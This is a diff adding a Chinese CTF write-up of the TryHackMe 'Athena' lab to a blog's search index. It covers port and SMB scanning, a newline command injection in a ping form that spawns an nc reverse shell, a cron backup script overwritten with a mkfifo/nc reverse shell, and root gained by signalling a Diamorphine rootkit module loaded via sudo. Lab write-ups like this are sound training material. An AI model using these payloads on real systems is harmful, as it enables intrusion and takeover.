@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>打靶记录(八一)之THMAthena</title>
+      <link href="/2023/12/26/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E5%85%AB%E4%B8%80)%E4%B9%8BTHMAthena/"/>
+      <url>/2023/12/26/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E5%85%AB%E4%B8%80)%E4%B9%8BTHMAthena/</url>
+      
+        <content type="html"><![CDATA[<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nmap --min-rate=10000 -p- 10.10.114.27</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-26 14:22 UTC</span><br><span class="line">Nmap scan report for ip-10-10-114-27.eu-west-1.compute.internal (10.10.114.27)</span><br><span class="line">Host is up (0.0084s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">80/tcp  open  http</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">MAC Address: 02:AB:07:41:29:CF (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 4.13 seconds</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nmap -sV -sT -sC -O -p22,80,139,445 10.10.114.27</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-26 14:23 UTC</span><br><span class="line">Nmap scan report for ip-10-10-114-27.eu-west-1.compute.internal (10.10.114.27)</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 3bc8f813e0cb42600df64cdc55d83bed (RSA)</span><br><span class="line">|   256 1f42e1c3a5172a38693e9b736dcd5633 (ECDSA)</span><br><span class="line">|_  256 7a67598d37c56729e853e81edfb0c71e (ED25519)</span><br><span class="line">80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Athena - Gods of olympus</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 4.6.2</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.6.2</span><br><span class="line">MAC Address: 02:AB:07:41:29:CF (Unknown)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 3.8 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   311: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">|_nbstat: NetBIOS name: ROUTERPANEL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2023-12-26T14:23:24</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 18.33 seconds</span><br></pre></td></tr></tbody></table></figure><h1 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h1><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">smbmap -H 10.10.114.27</span><br><span class="line">[+] IP: 10.10.114.27:445        Name: ip-10-10-114-27.eu-west-1.compute.internal        </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        public                                                  READ ONLY</span><br><span class="line">        IPC$                                                    NO ACCESS       IPC Service (Samba 4.15.13-Ubuntu)</span><br></pre></td></tr></tbody></table></figure><p>有一个可读的共享，里面有一张小纸条。告诉了有一个/myrouterpanel目录</p><h1 id="Gesthell"><a href="#Gesthell" class="headerlink" title="Gesthell"></a>Gesthell</h1><p>用于ping，确实可以ping到kali主机看一下命令执行。但是”,””&amp;”之类的都被黑名单了，上换行符(%0A)。做个反弹shell</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">curl http://10.10.114.27/myrouterpanel/ping.php -X POST -d 'ip=%0A nc -e /bin/bash 10.11.38.245 444 &amp;submit='</span><br></pre></td></tr></tbody></table></figure><p>上pspy，发现有一个定时执行的/usr/share/backup/backup.sh，身份是athena</p><p>而且我们有可修改权限，写一个反弹shell进去,开启监听</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">echo '#!/bin/bash'&gt;/usr/share/backup/backup.sh</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.11.38.245 443 &gt;/tmp/f'&gt;&gt;/usr/share/backup/backup.sh</span><br></pre></td></tr></tbody></table></figure><p>现在我们是athena。做个ssh-keygen</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>sudo -l发现可以无密码地执行:/usr/sbin/insmod /mnt/…/secret/venom.ko</p><p>可以将一个内核模块加载进linux内核中</p><p>可以先在靶机上开个web服务器来下载这个内核文件到ida进行逆向</p><p>其中有一个函数叫做diamorphine，是一个rootkit(隐藏在内核中的恶意软件)</p><p>放IDA中反编译一下，有一个give_root函数，发现在hack_kill中调用了它</p><p>只要向进程发送了57信号就可以获得root</p><p>运行sudo指令之后运行</p><p>kill -57 pid(随便写一个)</p><p>现在我们是root</p><h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>md打到一半WP没保存，直接重写(恼。比较陌生的也就是rootkit和最后的内核之类的，了解一下其实还挺简单的，逆向也没什么难度。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网安 </tag>
+            
+            <tag> 渗透测试 </tag>
+            
+            <tag> 打靶 </tag>
+            
+            <tag> linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>打靶记录(八十)之THMVulnNetdotjar</title>
       <link href="/2023/12/24/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E5%85%AB%E5%8D%81)%E4%B9%8BTHMVulnNetdotjar/"/>
       <url>/2023/12/24/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E5%85%AB%E5%8D%81)%E4%B9%8BTHMVulnNetdotjar/</url>
